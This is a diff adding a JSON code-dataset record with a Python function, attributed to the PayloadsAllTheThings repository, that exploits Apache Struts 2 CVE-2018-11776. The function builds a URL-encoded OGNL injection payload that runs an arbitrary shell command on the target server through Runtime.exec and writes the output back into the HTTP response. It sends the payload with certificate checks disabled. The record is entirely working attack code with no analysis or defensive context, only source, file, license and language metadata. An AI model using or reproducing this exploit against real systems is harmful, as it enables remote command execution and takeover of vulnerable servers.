@@ -1,0 +1,7 @@
+{
+    "code": "def exploit(url, cmd):\n    parsed_url = parse_url(url)\n\n    injection_point = check(url)\n    if injection_point is None:\n        print(\"[%] Target is not vulnerable.\")\n        return(0)\n    print(\"[%] Exploiting...\")\n\n    payload = \"\"\"%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{0}%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D\"\"\".format(cmd)\n\n    testing_url = \"%s%s\" % (parsed_url[\"site\"], injection_point)\n    testing_url = testing_url.replace(\"{{INJECTION_POINT}}\", payload)\n\n    try:\n        resp = requests.get(testing_url, headers=headers, verify=False, timeout=timeout, allow_redirects=False)\n    except Exception as e:\n        print(\"EXCEPTION::::--> \" + str(e))\n        return(1)\n\n    print(\"[%] Response:\")\n    print(resp.text)\n    return(0)",
+    "source": "github_repo:swisskyrepo/PayloadsAllTheThings",
+    "file": "CVE Exploits/Apache Struts 2 CVE-2018-11776.py",
+    "license": "MIT",
+    "language": "python"
+}
